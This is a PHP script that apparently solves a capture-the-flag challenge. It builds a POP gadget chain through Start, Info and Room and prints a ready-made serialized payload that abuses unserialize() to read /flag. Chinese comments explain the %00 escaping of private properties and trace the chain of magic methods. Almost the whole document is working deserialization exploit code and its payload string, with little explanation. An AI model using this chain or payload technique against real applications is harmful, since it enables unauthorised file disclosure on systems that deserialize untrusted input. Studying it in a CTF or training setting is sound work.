<?php
class Start
{
    public $name='guest';
    public $flag='syst3m("cat 127.0.0.1/etc/hint");';

    public function __construct(){
        #echo "I think you need /etc/hint . Before this you need to see the source code";
    }

    public function _sayhello(){
        echo $this->name;
        return 'ok';
    }

    public function __wakeup(){
        echo "hi";
        $this->_sayhello();
    }
    public function __get($cc){
        echo "give you flag : ".$this->flag;
        return ;
    }
}
class Info
{
    private $phonenumber=123123;
    public $promise='I do';

    public function __construct(){
        $this->promise='I will not !!!!';
        return $this->promise;
    }

    public function __toString(){
        return $this->file['filename']->ffiillee['ffiilleennaammee'];
    }
}
class Room
{
    public $filename='/flag';
    public $sth_to_set;
    public $a='';

    public function __get($name){
        $function = $this->a;
        return $function();
    }

    public function Get_hint($file){
        $hint=base64_encode(file_get_contents($file));
        echo $hint;
        return ;
    }

    public function __invoke(){
        $content = $this->Get_hint($this->filename);
        echo $content;
    }
}
$a=new Start();
$a->name=new Info();
$a->name->file['filename']=new Room();
$a->name->file['filename']->a=new Room();
echo serialize($a);
//注意到phonenumber为private,Info前后要加%00(protected不强制要求)
//O:5:"Start":2:{s:4:"name";O:4:"Info":3:{s:17:"%00Info%00phonenumber";i:123123;s:7:"promise";s:15:"I will not !!!!";s:4:"file";a:1:{s:8:"filename";O:4:"Room":3:{s:8:"filename";s:5:"/flag";s:10:"sth_to_set";N;s:1:"a";O:4:"Room":3:{s:8:"filename";s:5:"/flag";s:10:"sth_to_set";N;s:1:"a";s:0:"";}}}}s:4:"flag";s:33:"syst3m("cat 127.0.0.1/etc/hint");";}
//pop chain:new Start()->__wakeup->_sayhello->name=new Info()->__tostring:file['filename']=new Room()->__get:a=new Room()->__invoke:Get_hint()
